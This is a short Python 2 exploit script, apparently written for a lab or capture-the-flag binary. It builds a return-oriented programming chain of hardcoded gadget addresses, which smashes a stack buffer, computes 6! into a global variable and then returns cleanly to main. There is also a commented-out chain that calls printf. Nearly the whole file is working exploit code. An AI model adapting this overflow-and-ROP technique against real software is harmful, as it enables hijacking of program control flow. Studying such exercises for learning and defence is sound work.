#! /usr/bin/python2
from sys import stdout, stderr

stdout.write("\x01\x02\x03\x04\x05\x06\n")  # To be read into `plaintext`

# Note payload cannot contain ord("\n")


# Printf test
# payload = [0x00000000] * 6 + [
# 	0x80512e0,  # printf address
# 	0x0805ebf9, # pop edx; pop ebx; ret;
# 	0x80e6ce0, # plaintext  #0x80b40a4, # format string
# 	125, # argument to printf %d argument
# 	0x080507f0,  # exit address
# ]
"""
We can use 125 to a register value if we can put
4 pops in one ROP. prop number, plaintex, ROP with 3 pops, and printf address
"""

# Print the value of GLB using main.
payload = [0x00000000] * 6 + \
          [
              0x080640c1,  # pop ecx
              0x080e6ce0,  # format string address
              0x080b054a,  # pop eax
              0x00000001,  # eax=1
          ] + [  # Calculate 6! in eax
              0x0806b347,  # imul eax,[ecx]
              0x0804900e,  # ret gadget address
              0x0807c165,  # inc ecx
          ] * 6 + [
              0x0805ebf9,  # pop edx; pop ebx; ret;
              0x80e6cc0,  # &glb
              0x0,  # Dummy Value (put in ebx)
              0x0805f932,  # mov dword ptr [edx], eax; ret;

              0x080b2643,  # pop ebx; ret;
              0x80e5000,  # $ebx at start of concatenate strings
              0x08049859,  # pop ebp; ret;
              0xffffd018,  # original ebp
              0x08049eed,  # the return address in main
          ]

#        	&i   - &buffer
len_buffer = 0x28 - 0x1c

# Write our required return address and data to the stack
byte_mask = (0b1 << 8) - 1
i = 0
for word in payload:
    assert (word >> 32) == 0  # 4 byte address
    for j in range(4):
        byte = word & byte_mask
        if not (i == len(payload) - 1 and j == 3):
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x00\x00\x00")
        else:
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x09\x00\x00")
        word >>= 8
    i += 1

stdout.flush()
